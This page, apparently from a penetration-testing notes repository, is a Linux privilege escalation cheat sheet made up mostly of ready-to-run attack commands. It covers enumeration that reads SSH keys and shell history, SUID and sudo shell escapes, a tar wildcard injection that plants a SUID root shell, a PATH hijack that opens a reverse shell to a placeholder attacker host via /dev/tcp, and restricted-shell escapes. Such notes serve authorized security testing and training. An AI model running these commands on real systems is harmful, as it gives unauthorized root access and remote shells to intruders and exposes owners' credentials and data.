[← Back to Home](../README.md)

# 12 — Linux Privilege Escalation

## 1. Initial Enumeration

```bash
whoami && id && sudo -l
uname -a && cat /etc/os-release
ps aux | grep root
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
cat /etc/crontab && ls -la /etc/cron.*
echo $PATH
find / -writable -type d 2>/dev/null | head -20
cat ~/.bash_history
find / -name "id_rsa" 2>/dev/null
env
```

## 2. SUID Exploitation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Cross-reference against GTFOBins (gtfobins.github.io)
find . -exec /bin/sh -p \;        # find with SUID
vim -c ':!/bin/sh'                  # vim with SUID
bash -p                              # bash with SUID
```

## 3. Sudo Abuse

```bash
sudo -l
# (ALL) NOPASSWD: ALL           → sudo su
# A specific binary listed      → check GTFOBins for a sudo bypass
```

## 4. Cron Job Abuse

```bash
cat /etc/crontab
ls -la /etc/cron.daily/
# A writable script that runs as root → edit it
# A wildcard used inside a tar command in a cron job → wildcard abuse (below)
```

## 5. Wildcard Abuse (tar)

```bash
# If a cron job runs something like: tar -czf backup.tar.gz *
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
# Wait for the cron job to run
/tmp/rootbash -p
```

## 6. PATH Abuse

```bash
# If a script calls a binary without specifying its full path
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/binary_name
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /tmp/binary_name
chmod +x /tmp/binary_name
./vulnerable_script
```

## 7. Kernel Exploits

```bash
uname -a
searchsploit linux kernel <version>
# Compile and run as a LAST RESORT — this can crash the system
```

## 8. Restricted Shell Escape

```bash
# rbash / rksh escape
python -c 'import pty; pty.spawn("/bin/bash")'
# or
perl -e 'exec "/bin/bash";'
# or from within vim: :set shell=/bin/bash then :shell
# or: awk 'BEGIN {system("/bin/bash")}'
```

## Related Pages

- The Windows equivalent → [Windows Privilege Escalation](10-Windows-Privilege-Escalation.md)
- After landing root → [Post-Exploitation](13-Post-Exploitation.md)
- Cracking any credentials you find → [Password Cracking & Hash Attacks](06-Password-Cracking-and-Hash-Attacks.md)
